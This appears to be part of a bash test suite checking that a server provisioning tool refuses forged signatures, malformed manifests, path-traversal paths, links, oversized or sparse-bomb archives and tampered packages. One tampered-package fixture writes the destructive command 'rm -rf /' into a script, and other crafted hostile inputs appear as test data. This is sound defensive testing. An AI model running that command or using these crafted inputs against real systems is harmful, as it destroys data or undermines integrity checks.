printf 'locked\n' > "$WORK/results-locked"
RRES="$WORK/results-locked" recipe refuse "another run holds the lock" "another recipe-run is running" recipe-run 0.4.0 hetzner
nothing_ran "another run holds the lock"
absent "another run holds the lock: nothing is downloaded" "download: "

echo "== recipe-run: the signature"
M=recipes-0.4.0-hetzner-ubuntu-26.04.manifest
cp -R "$WORK/rel-good" "$WORK/rel-forged"
printf 'step %s always 0.1.0 0.4.0 - stack/09-logs.sh\n' "$SHA_A" >> "$WORK/rel-forged/$M"
cp -R "$WORK/rel-good" "$WORK/rel-otherkey"
rsign "$WORK/rel-otherkey/$M" "$RKEY-other.sec"
cp -R "$WORK/rel-good" "$WORK/rel-nosig"
rm "$WORK/rel-nosig/$M.minisig"
cp -R "$WORK/rel-good" "$WORK/rel-badsig"
printf 'not a signature\n' > "$WORK/rel-badsig/$M.minisig"
cp -R "$WORK/rel-good" "$WORK/rel-bigsig"
head -c 5000 /dev/zero | tr '\0' a > "$WORK/rel-bigsig/$M.minisig"
# A legacy (Ed) signature with the right key: refused, only a prehashed (ED) one is accepted.
cp -R "$WORK/rel-good" "$WORK/rel-legacy"
rsign "$WORK/rel-legacy/$M" "$RKEY.sec" -l
check "the legacy signature is good without -H" minisign -V -q -P "$TEST_KEY" -m "$WORK/rel-legacy/$M"
for bad in forged otherkey badsig legacy; do
  RDL="$WORK/rel-$bad" recipe refuse "signature: $bad" "signature check failed: $M, nothing ran" recipe-run 0.4.0 hetzner
  nothing_ran "signature: $bad"
  absent "signature: $bad: the package is not downloaded" "recipes-0.4.0.tar.gz"
done
RDL="$WORK/rel-nosig" recipe refuse "no signature" "download failed: https://github.com/eeploi/recipes/releases/download/v0.4.0/$M.minisig" recipe-run 0.4.0 hetzner
nothing_ran "no signature"
RDL="$WORK/rel-bigsig" recipe refuse "signature too large" "download too large: https://github.com/eeploi/recipes/releases/download/v0.4.0/$M.minisig" recipe-run 0.4.0 hetzner
RDL="$WORK/rel-good" recipe refuse "another provider's release is not there" "download failed: https://github.com/eeploi/recipes/releases/download/v0.4.0/recipes-0.4.0-other-ubuntu-26.04.manifest" recipe-run 0.4.0 other
RDL="$WORK/rel-good" recipe refuse "a release that is not there" "download failed" recipe-run 0.4.2 hetzner

echo "== recipe-run: the manifest"
remanifest release sed 's/^release 0.4.0$/release 0.4.1/'
remanifest provider sed 's/^target hetzner /target other /'
remanifest min-high sed 's/^min-helper .*/min-helper 1.2.0/'
remanifest min-low sed 's/^min-helper .*/min-helper 0.9.0/'
remanifest min-bad sed 's/^min-helper .*/min-helper 1.1/'
remanifest format2 sed 's/^format 1$/format 2/'
remanifest noformat sed '/^format 1$/d'
# shellcheck disable=SC2016 # awk's own $0
remanifest formatlate awk 'NR == 1 { f = $0; next } { print } NR == 2 { print f }'
remanifest release2 sed '/^release /p'
remanifest target2 sed '/^target /p'
remanifest min2 sed '/^min-helper /p'
remanifest norelease sed '/^release /d'
remanifest notarget sed '/^target /d'
remanifest nomin sed '/^min-helper /d'
remanifest unknown awk '{ print } /^min-helper / { print "run stack/x.sh" }'
remanifest marker sed 's/ always \(.*\) stack\/09-logs.sh$/ later \1 stack\/09-logs.sh/'
remanifest dots sed 's# stack/09-logs.sh$# stack/../stack/09-logs.sh#'
remanifest dot sed 's# stack/09-logs.sh$# stack/./09-logs.sh#'
remanifest absolute sed 's# stack/09-logs.sh$# /stack/09-logs.sh#'
remanifest hidden sed 's# stack/fingerprint.sh$# stack/.fingerprint.sh#'
remanifest double sed 's# stack/09-logs.sh$# stack//09-logs.sh#'
remanifest space sed 's# stack/fingerprint.sh$# stack/finger print.sh#'
remanifest dash sed 's# stack/fingerprint.sh$# -fingerprint.sh#'
remanifest partdash sed 's# stack/09-logs.sh$# stack/-09-logs.sh#'
remanifest twice sed 's# stack/fingerprint.sh$# stack/09-logs.check.sh#'
remanifest novalues sed '/ stack\/values.sh$/d'
remanifest nostart sed '/ stack\/start.sh$/d'
remanifest startstep sed 's#^file \([0-9a-f]*\) stack/start.sh$#step \1 always 0.1.0 0.1.0 - stack/start.sh#'
remanifest shortsha sed 's/^\(file [0-9a-f]\{63\}\)[0-9a-f] /\1 /'
# shellcheck disable=SC2016 # awk's own $0
remanifest cr awk '{ if ($0 == "release 0.4.0") printf "%s\r\n", $0; else print }'
RDL="$WORK/rel-min-low" recipe ok "min-helper lower than this helper" "result ok" recipe-run 0.4.0 hetzner
RDL="$WORK/rel-release" recipe refuse "manifest of another release" "the manifest is for release 0.4.1, not 0.4.0" recipe-run 0.4.0 hetzner
RDL="$WORK/rel-provider" recipe refuse "manifest of another provider" "the manifest is for other ubuntu-26.04, not hetzner ubuntu-26.04" recipe-run 0.4.0 hetzner
RDL="$WORK/rel-min-high" recipe refuse "min-helper higher than this helper" "recipes 0.4.0 needs eeploi-helper 1.2.0 or newer, this is 1.1.0" recipe-run 0.4.0 hetzner
RDL="$WORK/rel-min-bad" recipe refuse "min-helper not a version" "invalid min-helper in the manifest: 1.1" recipe-run 0.4.0 hetzner
RDL="$WORK/rel-nomin" recipe refuse "no min-helper" "invalid min-helper in the manifest" recipe-run 0.4.0 hetzner
RDL="$WORK/rel-norelease" recipe refuse "no release line" "the manifest is for release , not 0.4.0" recipe-run 0.4.0 hetzner
RDL="$WORK/rel-notarget" recipe refuse "no target line" "the manifest is for , not hetzner ubuntu-26.04" recipe-run 0.4.0 hetzner
for bad in format2 noformat formatlate; do
  RDL="$WORK/rel-$bad" recipe refuse "manifest format: $bad" "not a format 1 manifest" recipe-run 0.4.0 hetzner
done
RDL="$WORK/rel-release2" recipe refuse "release twice" "release is set twice in the manifest" recipe-run 0.4.0 hetzner
RDL="$WORK/rel-target2" recipe refuse "target twice" "target is set twice in the manifest" recipe-run 0.4.0 hetzner
RDL="$WORK/rel-min2" recipe refuse "min-helper twice" "min-helper is set twice in the manifest" recipe-run 0.4.0 hetzner
RDL="$WORK/rel-unknown" recipe refuse "an unknown line" "invalid line in the manifest: run stack/x.sh" recipe-run 0.4.0 hetzner
RDL="$WORK/rel-marker" recipe refuse "an unknown marker" "invalid line in the manifest" recipe-run 0.4.0 hetzner
RDL="$WORK/rel-shortsha" recipe refuse "a short SHA-256" "invalid line in the manifest" recipe-run 0.4.0 hetzner
RDL="$WORK/rel-cr" recipe refuse "a carriage return" "the manifest is for release 0.4.0"$'\r' recipe-run 0.4.0 hetzner
for bad in dots dot absolute hidden double space dash partdash; do
  RDL="$WORK/rel-$bad" recipe refuse "manifest path: $bad" "a manifest path that is absolute, has a part that starts with . or -, or can't be read safely" recipe-run 0.4.0 hetzner
  nothing_ran "manifest path: $bad"
done
# A part may start with _ or a digit, in a file and in a step (and so in the state).
mkdir -p "$WORK/rsrc-lead"
cp -R "$WORK/rsrc/." "$WORK/rsrc-lead"
RSRC="$WORK/rsrc-lead" rfile _lead.sh 'echo lead\n'
RSRC="$WORK/rsrc-lead" rfile 9lead.sh 'echo lead\n'
RSRC="$WORK/rsrc-lead" rfile _stack/9-lead.sh 'echo lead-step\n'
RELEASE_STEPS="$RELEASE_STEPS
always _stack/9-lead.sh" RELEASE_FILES="$RELEASE_FILES _lead.sh 9lead.sh" RSRC="$WORK/rsrc-lead" release lead
RDL="$WORK/rel-lead" recipe ok "manifest paths starting with _ and a digit" "result ok" recipe-run 0.4.0 hetzner
SHA_LEAD=$(rsha "$WORK/rsrc-lead/_stack/9-lead.sh")
RDL="$WORK/rel-lead" recipe ok "a step under _ and a digit, in the state" "  step $SHA_LEAD _stack/9-lead.sh" recipe-run 0.4.0 hetzner
state_dir lead "release 0.4.0\nstep $SHA_LEAD _stack/9-lead.sh\n"
RSTATE="$WORK/recipes-lead" RDL="$WORK/rel-lead" ERR_TO=/dev/null recipe ok "the state reads it back" "step same _stack/9-lead.sh" recipe-run 0.4.0 hetzner
state_dir partdash "release 0.4.0\nstep $SHA_A stack/-07-updates.sh\n"
state_dir dash "release 0.4.0\nstep $SHA_A -stack/07-updates.sh\n"
state_dir hidden "release 0.4.0\nstep $SHA_A stack/.07-updates.sh\n"
for bad in partdash dash hidden; do
  RSTATE="$WORK/recipes-$bad" recipe refuse "state: a part that starts with - or . ($bad)" "invalid line in $WORK/recipes-$bad/state" recipe-run 0.4.0 hetzner
done
RDL="$WORK/rel-twice" recipe refuse "a path twice" "a path twice in the manifest: stack/09-logs.check.sh" recipe-run 0.4.0 hetzner
RDL="$WORK/rel-novalues" recipe refuse "no values.sh" "no stack/values.sh in the manifest" recipe-run 0.4.0 hetzner
RDL="$WORK/rel-nostart" recipe refuse "no start.sh" "no stack/start.sh in the manifest" recipe-run 0.4.0 hetzner
RDL="$WORK/rel-startstep" recipe refuse "start.sh as a step" "no stack/start.sh in the manifest" recipe-run 0.4.0 hetzner
cp -R "$WORK/rel-good" "$WORK/rel-bigmanifest"
head -c 70000 /dev/zero | tr '\0' '#' >> "$WORK/rel-bigmanifest/$M"
rsign "$WORK/rel-bigmanifest/$M"
RDL="$WORK/rel-bigmanifest" recipe refuse "manifest too large" "download too large: https://github.com/eeploi/recipes/releases/download/v0.4.0/$M" recipe-run 0.4.0 hetzner
nothing_ran "manifest too large"

echo "== recipe-run: the package"
# package <name> <change in the source> [<more paths>]: the good manifest, with a package made from a
# changed source.
package() {
  local src="$WORK/rsrc-$1"
  cp -R "$WORK/rsrc" "$src"
  (cd "$src" && eval "$2")
  cp -R "$WORK/rel-good" "$WORK/rel-$1"
  rpack "$src" "$WORK/rel-$1/recipes-0.4.0.tar.gz" "${3:-}"
}
package changed 'printf "echo changed\n" >> stack/07-updates.sh'
package changedcheck 'printf "rm -rf /\n" > stack/09-logs.check.sh'
package changedunused 'printf "x\n" >> stack/fingerprint.sh'
package link 'rm stack/09-logs.sh && ln -s 00-apt-retries.sh stack/09-logs.sh'
package missing 'rm stack/09-logs.check.sh'
package extra 'printf "echo extra\n" > stack/extra.sh' stack/extra.sh
package linkextra 'ln -s 00-apt-retries.sh stack/other.sh' stack/other.sh
package hardlink 'ln stack/09-logs.sh stack/other.sh' stack/other.sh
package huge 'head -c 9000000 /dev/zero > stack/huge.sh' stack/huge.sh
cp -R "$WORK/rel-good" "$WORK/rel-nopackage"
rm "$WORK/rel-nopackage/recipes-0.4.0.tar.gz"
cp -R "$WORK/rel-good" "$WORK/rel-notgzip"
printf 'not a package\n' > "$WORK/rel-notgzip/recipes-0.4.0.tar.gz"
RDL="$WORK/rel-changed" recipe refuse "a changed step" "changed file: stack/07-updates.sh (its SHA-256 is not the manifest's)" recipe-run 0.4.0 hetzner
nothing_ran "a changed step"
RDL="$WORK/rel-changedcheck" recipe refuse "a changed check" "changed file: stack/09-logs.check.sh" recipe-run 0.4.0 hetzner
nothing_ran "a changed check"
RDL="$WORK/rel-changedunused" recipe refuse "a changed file that never runs" "changed file: stack/fingerprint.sh" recipe-run 0.4.0 hetzner
LINK_MSG="the package holds a link or another file that is not a plain file"
RDL="$WORK/rel-link" recipe refuse "a link in the package" "$LINK_MSG" recipe-run 0.4.0 hetzner
nothing_ran "a link in the package"
RDL="$WORK/rel-linkextra" recipe refuse "a link the manifest doesn't list" "$LINK_MSG" recipe-run 0.4.0 hetzner
RDL="$WORK/rel-hardlink" recipe refuse "a hard link in the package" "$LINK_MSG" recipe-run 0.4.0 hetzner
RDL="$WORK/rel-huge" recipe refuse "a package too large unpacked" "the package is too large unpacked" recipe-run 0.4.0 hetzner
nothing_ran "a package too large unpacked"
RDL="$WORK/rel-missing" recipe refuse "a file not in the package" "cannot read stack/09-logs.check.sh from the package" recipe-run 0.4.0 hetzner
RDL="$WORK/rel-nopackage" recipe refuse "no package" "download failed: https://github.com/eeploi/recipes/releases/download/v0.4.0/recipes-0.4.0.tar.gz" recipe-run 0.4.0 hetzner
RDL="$WORK/rel-notgzip" recipe refuse "not a package" "cannot read" recipe-run 0.4.0 hetzner
# The package as the recipes build it: git archive, with its pax header.
mkdir -p "$WORK/rsrc-git"
cp -R "$WORK/rsrc/." "$WORK/rsrc-git"
(cd "$WORK/rsrc-git" && git init -q && git add -A \
  && git -c user.name=test -c user.email=test@example.com -c commit.gpgsign=false commit -qm test)
cp -R "$WORK/rel-good" "$WORK/rel-git"
git -C "$WORK/rsrc-git" archive --format=tar.gz -o "$WORK/rel-git/recipes-0.4.0.tar.gz" HEAD
RDL="$WORK/rel-git" recipe ok "a package made by git archive" "result ok" recipe-run 0.4.0 hetzner
# big_release <name> <bytes> [<fill>]: the good source with a fingerprint of that size (# or the fill
# byte), as a release of its own.
big_release() {
  mkdir -p "$WORK/rsrc-$1"
  cp -R "$WORK/rsrc/." "$WORK/rsrc-$1"
  head -c "$2" /dev/zero | tr '\0' "${3:-#}" > "$WORK/rsrc-$1/stack/fingerprint.sh"
  RSRC="$WORK/rsrc-$1" release "$1"
}
big_release bigfile 1048577
big_release fullfile 1048576
RDL="$WORK/rel-bigfile" recipe refuse "a file over 1 MB" "a file too large in the package: stack/fingerprint.sh" recipe-run 0.4.0 hetzner
nothing_ran "a file over 1 MB"
RDL="$WORK/rel-fullfile" recipe ok "a file of 1 MB" "result ok" recipe-run 0.4.0 hetzner
# tar_block <file> <name> <size> <type>: a tar header, appended to the file.
tar_block() {
  local h="$WORK/tar-header" sum
  [ ${#2} -le 100 ] || { echo "tar_block: name too long: $2" >&2; exit 1; }
  {
    printf '%s' "$2"
    head -c $((100 - ${#2})) /dev/zero
    printf '%s\0%s\0%s\0%011o\0%011o\0        %s' 0000644 0000000 0000000 "$3" 0 "$4"
    head -c 100 /dev/zero
    printf 'ustar\0%s' 00
    head -c 247 /dev/zero
  } > "$h"
  sum=$(od -An -tu1 -v "$h" | awk '{ for (i = 1; i <= NF; i++) s += $i } END { print s }')
  printf '%06o\0 ' "$sum" | dd of="$h" bs=1 seek=148 conv=notrunc 2> /dev/null
  cat "$h" >> "$1"
}
# tar_data <file> <data file>: the data, then zeros up to a whole block, appended to the file.
tar_data() {
  cat "$2" >> "$1"
  head -c $(((512 - $(wc -c < "$2") % 512) % 512)) /dev/zero >> "$1"
}
# pax_record <key=value>: a pax header line, its length first.
pax_record() {
  local n=$((${#1} + 3))
  while [ $((${#1} + 2 + ${#n})) -ne "$n" ]; do n=$((${#1} + 2 + ${#n})); done
  printf '%d %s\n' "$n" "$1"
}
# sparse_release <name> <bytes>: the good release with stack/fingerprint.sh as that many zero bytes,
# put in the package as a sparse file (pax, GNU sparse 1.0) that takes up one block there.
sparse_release() {
  local pkg="$WORK/rel-$1/recipes-0.4.0.tar" pax="$WORK/pax-$1" map="$WORK/map-$1"
  big_release "$1" "$2" '\0'
  {
    pax_record GNU.sparse.major=1
    pax_record GNU.sparse.minor=0
    pax_record GNU.sparse.name=stack/fingerprint.sh
    pax_record "GNU.sparse.realsize=$2"
  } > "$pax"
  # The map: one part, of no bytes, at the end; the rest is a hole.
  printf '1\n%s\n0\n' "$2" > "$map"
  : > "$pkg"
  tar_block "$pkg" PaxHeaders/fingerprint.sh "$(wc -c < "$pax")" x
  tar_data "$pkg" "$pax"
  tar_block "$pkg" GNUSparseFile.0/fingerprint.sh 512 0
  tar_data "$pkg" "$map"
  # Then the other files: gzip reads two streams one after the other as one.
  gzip -c "$pkg" > "$pkg.gz"
  RELEASE_FILES=${RELEASE_FILES/stack\/fingerprint.sh/} rpack "$WORK/rsrc-$1" "$pkg.rest.gz"
  cat "$pkg.rest.gz" >> "$pkg.gz"
  rm "$pkg" "$pkg.rest.gz"
}
sparse_release sparsebig 16777216
sparse_release sparsefull 1048576
# Read out in full before the cap, the file fails on the file size limit (a stand-in for a full disk)
# with GNU tar; bsdtar left the hole out of the file, so its SHA-256 was wrong.
FSIZE=$(ulimit -S -f)
ulimit -S -f 4096
RDL="$WORK/rel-sparsebig" recipe refuse "a sparse file over 1 MB" "a file too large in the package: stack/fingerprint.sh" recipe-run 0.4.0 hetzner
nothing_ran "a sparse file over 1 MB"
RDL="$WORK/rel-sparsefull" recipe ok "a sparse file of 1 MB" "result ok" recipe-run 0.4.0 hetzner
ulimit -S -f "$FSIZE"
# A path under a file the manifest lists: it can't be read out.
remanifest underfile awk -v sha="$SHA_A" '{ print } / stack\/start.sh$/ { print "file " sha " stack/start.sh/x" }'
RDL="$WORK/rel-underfile" recipe refuse "a path under a file" "cannot read stack/start.sh/x from the package" recipe-run 0.4.0 hetzner
# A path that is a folder of a file read before it.
remanifest folderfile awk -v sha="$SHA_A" '{ print } / stack\/start.sh$/ { print "file " sha " stack" }'
RDL="$WORK/rel-folderfile" recipe refuse "a path that is a folder" "cannot read stack from the package" recipe-run 0.4.0 hetzner
absent "a path that is a folder: no size error" "integer expression"
RDL="$WORK/rel-extra" recipe ok "a file the manifest doesn't list is never read" "result ok" recipe-run 0.4.0 hetzner
absent "the extra file never runs" "echo extra"
# Placeholders: only the values, and only in the files a run uses.
# place_release <name> <path> <text>: the good source with one file changed, as a release of its own.
place_release() {
  mkdir -p "$WORK/rsrc-$1"
  cp -R "$WORK/rsrc/." "$WORK/rsrc-$1"
  RSRC="$WORK/rsrc-$1" rfile "$2" "$3"
  RSRC="$WORK/rsrc-$1" release "$1"
}
place_release place stack/09-logs.sh 'echo {ranges}\n'
place_release placecheck stack/07-updates.check.sh 'test {npm}\n'
RDL="$WORK/rel-place" recipe refuse "a placeholder in a step it can't fill in" "a placeholder recipe-run can't fill in: {ranges} in stack/09-logs.sh" recipe-run 0.4.0 hetzner
nothing_ran "a placeholder in a step it can't fill in"
RDL="$WORK/rel-placecheck" recipe refuse "a placeholder in a check it can't fill in" "a placeholder recipe-run can't fill in: {npm} in stack/07-updates.check.sh" recipe-run 0.4.0 hetzner
place_release adjacent stack/09-logs.sh 'echo {user}{ranges}\n'
# shellcheck disable=SC2016 # bash's own braces
place_release inbash stack/09-logs.sh 'for user in a; do echo "${user}"; done\n'
# shellcheck disable=SC2016 # bash's own braces
place_release inword stack/07-updates.check.sh 'echo x{port}\n'
place_release adjacentok stack/09-logs.sh 'echo {user}{port}\n'
RDL="$WORK/rel-adjacent" recipe refuse "a placeholder right after a value" "a placeholder recipe-run can't fill in: {ranges} in stack/09-logs.sh" recipe-run 0.4.0 hetzner
RDL="$WORK/rel-inbash" recipe refuse "a value in bash's braces" "a value in bash's own braces, which recipe-run can't fill in safely: stack/09-logs.sh" recipe-run 0.4.0 hetzner
nothing_ran "a value in bash's braces"
RDL="$WORK/rel-inword" recipe refuse "a value right after a word" "a value in bash's own braces, which recipe-run can't fill in safely: stack/07-updates.check.sh" recipe-run 0.4.0 hetzner
RDL="$WORK/rel-adjacentok" recipe ok "two values side by side" "echo eeploi22" recipe-run 0.4.0 hetzner
awk 'NR <= 4 { print; next } NR == 5 { for (i = 0; i < 201; i++) printf "file %064d stack/f%d.sh\n", 0, i }' \
  "$WORK/rel-good/$M" > "$WORK/manifest-many"
mkdir -p "$WORK/rel-many"
cp "$WORK/manifest-many" "$WORK/rel-many/$M"
rsign "$WORK/rel-many/$M"
RDL="$WORK/rel-many" recipe refuse "more than 200 files" "more than 200 files in the manifest" recipe-run 0.4.0 hetzner

echo "== recipe-run: the run"
# What eeploi.com reads: stdout alone. A dry run's own lines are on stdout too, the steps' on stderr.
B='  '
ERR_TO=/dev/null recipe ok "a first run runs every always step" "recipe-run 0.4.0 hetzner ubuntu-26.04
step ran stack/00-apt-retries.sh
step ran stack/07-updates.sh
step ran stack/09-logs.sh
check ok" recipe-run 0.4.0 hetzner
ERR_TO=/dev/null recipe ok "then every check, in order" "check ok first-boot/00-lock-root.check.sh
check ok stack/00-apt-retries.check.sh
check ok stack/07-updates.check.sh
check ok stack/09-logs.check.sh" recipe-run 0.4.0 hetzner
# The dry run prints the state it would write before the last line.
ERR_TO=/dev/null recipe ok "the last line" "write: $WORK/recipes-none/state (644)
result ok" recipe-run 0.4.0 hetzner
recipe lacks "never a first-boot step" "run: first-boot/00-lock-root.sh"$'\n' recipe-run 0.4.0 hetzner
recipe lacks "never a window step" "ubuntu-26.04/01-packages.sh" recipe-run 0.4.0 hetzner
recipe lacks "never first-boot's start" "report_url" recipe-run 0.4.0 hetzner
recipe lacks "never the fingerprint" "run: stack/fingerprint.sh" recipe-run 0.4.0 hetzner
recipe ok "a step after start.sh and the values" "run: stack/09-logs.sh
  #!/usr/bin/env bash
  # eeploi provisioning for recipe-run. Run once as root on a fresh Ubuntu 26.04.
  set -euo pipefail
$B
  DEPLOY_USER=eeploi
  SSH_PORT=22
  PHP=8.4
  . /etc/os-release; [ \"${D}VERSION_ID\" = \"26.04\" ]
$B
  set -euo pipefail
  echo logs ${D}DEPLOY_USER" recipe-run 0.4.0 hetzner
# start.sh without set -e: the step still runs under it.
place_release nosete stack/start.sh '#!/usr/bin/env bash\n# eeploi provisioning for {name}.\n'
RDL="$WORK/rel-nosete" recipe ok "a step under set -e, whatever start.sh sets" "  PHP=8.4
  . /etc/os-release; [ \"${D}VERSION_ID\" = \"26.04\" ]
$B
  set -euo pipefail
  echo apt-retries" recipe-run 0.4.0 hetzner
ETC_DIR="$WORK/etc-recipes-port" recipe ok "the values from recipes.conf" "SSH_PORT=10000
  PHP=8.3" recipe-run 0.4.0 hetzner
recipe ok "bash's own braces stay" "echo \"${D}{distro_id}\" \"${D}nrconf{restart}\"" recipe-run 0.4.0 hetzner
recipe ok "a check after the values, under set -e" "run: stack/07-updates.check.sh
  #!/usr/bin/env bash
  DEPLOY_USER=eeploi
  SSH_PORT=22
  PHP=8.4
  . /etc/os-release; [ \"${D}VERSION_ID\" = \"26.04\" ]
$B
  set -euo pipefail
  trap 'echo \"  ${D}BASH_COMMAND\" >&2' ERR
  echo check-updates ${D}PHP" recipe-run 0.4.0 hetzner
recipe ok "an audit line per step" "log: eeploi-helper: eeploi: recipe-run 0.4.0: step ran stack/07-updates.sh" recipe-run 0.4.0 hetzner
recipe ok "an audit line per run" "log: eeploi-helper: eeploi: recipe-run 0.4.0: result ok" recipe-run 0.4.0 hetzner
SHA_APT=$(rsha "$WORK/rsrc/stack/00-apt-retries.sh")
SHA_UPD=$(rsha "$WORK/rsrc/stack/07-updates.sh")
SHA_LOGS=$(rsha "$WORK/rsrc/stack/09-logs.sh")
recipe ok "the state after a good run" "  release 0.4.0
  step $SHA_APT stack/00-apt-retries.sh
  step $SHA_UPD stack/07-updates.sh
  step $SHA_LOGS stack/09-logs.sh
write: $WORK/recipes-none/state (644)" recipe-run 0.4.0 hetzner
state_dir same "release 0.4.0\nstep $SHA_APT stack/00-apt-retries.sh\nstep $SHA_UPD stack/07-updates.sh\nstep $SHA_LOGS stack/09-logs.sh\n"
state_dir changed "release 0.3.0\nstep $SHA_APT stack/00-apt-retries.sh\nstep $SHA_A stack/07-updates.sh\nstep $SHA_LOGS stack/09-logs.sh\n"
RSTATE="$WORK/recipes-same" ERR_TO=/dev/null recipe ok "unchanged steps don't run again" "step same stack/00-apt-retries.sh
step same stack/07-updates.sh
step same stack/09-logs.sh" recipe-run 0.4.0 hetzner
RSTATE="$WORK/recipes-same" recipe lacks "unchanged: no step runs" "run: stack/07-updates.sh"$'\n' recipe-run 0.4.0 hetzner
RSTATE="$WORK/recipes-changed" ERR_TO=/dev/null recipe ok "only the changed step runs" "step same stack/00-apt-retries.sh
step ran stack/07-updates.sh
step same stack/09-logs.sh" recipe-run 0.4.0 hetzner
RSTATE="$WORK/recipes-changed" recipe ok "the changed step's new hash in the state" "  step $SHA_UPD stack/07-updates.sh" recipe-run 0.4.0 hetzner
printf 'fail stack/09-logs.check.sh\n' > "$WORK/results-drift"
RSTATE="$WORK/recipes-same" RRES="$WORK/results-drift" ERR_TO=/dev/null recipe fails "an unchanged step whose check fails runs again" "step same stack/07-updates.sh
step ran stack/09-logs.sh" recipe-run 0.4.0 hetzner
printf 'fail stack/07-updates.sh\n' > "$WORK/results-step"
RRES="$WORK/results-step" ERR_TO=/dev/null recipe fails "a failed step stops the steps after it" "step ran stack/00-apt-retries.sh
step failed stack/07-updates.sh
step skipped stack/09-logs.sh" recipe-run 0.4.0 hetzner
RRES="$WORK/results-step" ERR_TO=/dev/null recipe fails "after a failed step, the checks still run" "check ok stack/09-logs.check.sh
result failed" recipe-run 0.4.0 hetzner
RRES="$WORK/results-step" recipe fails "a failed step never runs the next one" "result failed" recipe-run 0.4.0 hetzner
absent "the step after a failed one does not run" "run: stack/09-logs.sh"$'\n'
RRES="$WORK/results-step" recipe fails "a skipped step in the system log" "log: eeploi-helper: eeploi: recipe-run 0.4.0: step skipped stack/09-logs.sh" recipe-run 0.4.0 hetzner
absent "no state after a failed step" "write: "
printf 'fail stack/07-updates.check.sh\n' > "$WORK/results-check"
RRES="$WORK/results-check" ERR_TO=/dev/null recipe fails "a failed check" "check ok stack/00-apt-retries.check.sh
check failed stack/07-updates.check.sh
check ok stack/09-logs.check.sh" recipe-run 0.4.0 hetzner
RRES="$WORK/results-check" ERR_TO=/dev/null recipe fails "a failed check fails the run" "result failed" recipe-run 0.4.0 hetzner
RRES="$WORK/results-check" recipe fails "a failed check keeps the steps' state" "write: $WORK/recipes-none/state (644)" recipe-run 0.4.0 hetzner

echo "== bin/release"
# Tags and releases never change (D-26 in DECISIONS.md): bin/release --check in a copy, a repo with its own origin, and stubs for gh, minisign and shellcheck.
# The copy's tests/run.sh only passes, so the tests don't run again inside it. RELEASE_EXISTS: gh finds the release.
REL="$WORK/release"
mkdir -p "$REL/stubs" "$REL/repo/bin" "$REL/repo/tests"
cat > "$REL/stubs/gh" << 'EOF'
#!/usr/bin/env bash
case "$1 $2" in
  "run list") echo "completed success" ;;
  "release view") [ -n "${RELEASE_EXISTS:-}" ] ;;
  *) exit 1 ;;
esac
EOF
printf '#!/bin/sh\nexit 0\n' > "$REL/stubs/minisign"
cp "$REL/stubs/minisign" "$REL/stubs/shellcheck"
chmod 755 "$REL/stubs"/*
cp "$ROOT/bin/release" "$REL/repo/bin/release"
printf "VERSION='1.2.3'\n" > "$REL/repo/eeploi-helper"
echo 'exit 0' > "$REL/repo/tests/run.sh"
# git without the user's own config (signing, hooks): only what these commands set.
rel_git() { GIT_CONFIG_GLOBAL=/dev/null GIT_CONFIG_NOSYSTEM=1 git -c user.name=Test -c user.email=test@example.com "$@"; }
rel_git init -q --bare "$REL/origin.git"
rel_git -C "$REL/repo" init -q -b main
rel_git -C "$REL/repo" add -A
rel_git -C "$REL/repo" commit -qm one
rel_git -C "$REL/repo" remote add origin "$REL/origin.git"
rel_git -C "$REL/repo" push -q origin main
rel_run() {
  OUT=$(cd "$REL/repo" && PATH="$REL/stubs:$PATH" GIT_CONFIG_GLOBAL=/dev/null GIT_CONFIG_NOSYSTEM=1 bash bin/release --check 2>&1)
  CODE=$?
}
rel_ok() {
  rel_run
  if [ "$CODE" -eq 0 ] && [[ $OUT == *"$2"* ]]; then pass; else failure "$1" "exit $CODE, expected 0 and: $2
$OUT"; fi
}
rel_refuse() {
  rel_run
  if [ "$CODE" -eq 1 ] && [[ $OUT == *"release: $2"* ]]; then pass; else failure "$1" "exit $CODE, expected 1 and: release: $2
$OUT"; fi
}
rel_ok "release: a new version passes the checks" "eeploi-helper 1.2.3 at $(rel_git -C "$REL/repo" rev-parse --short HEAD): v1.2.3 is new"
RELEASE_EXISTS=1 rel_refuse "release: a release of this version stops the checks" \
  "eeploi/helper already has a release v1.2.3, maybe a draft: releases are immutable, release a new version"
# The tag only on GitHub: the checks fetch it.
rel_git -C "$REL/repo" tag -a v1.2.3 -m v1.2.3
rel_git -C "$REL/repo" push -q origin refs/tags/v1.2.3
rel_git -C "$REL/repo" tag -d v1.2.3 > /dev/null
rel_refuse "release: the tag of this version stops the checks" "v1.2.3 already exists: releases are immutable, release a new version"
check "release: no tag moved, no release file replaced" \
  test "$(grep -cE -e 'push .*--force|--force .*push' -e '--clobber' -e 'tag .*-f( |$)' "$ROOT/bin/release")" -eq 0

echo "== system log"
ok "logs the call" "log: eeploi-helper: eeploi: vhost-enable example.com" vhost-enable example.com
IN=$'-----BEGIN CERTIFICATE-----\nMIIBszCCAVmgAwIBAgIU\n-----END CERTIFICATE-----' ok "logs the arguments, never stdin" $'log: eeploi-helper: eeploi: ssl-write example.com\n' ssl-write example.com
lacks "not the version" "log:" version

echo
echo "$PASS passed, $FAILED failed"
if [ "$FAILED" -gt 0 ]; then
  echo "Failed:$FAILURES"
  exit 1
fi
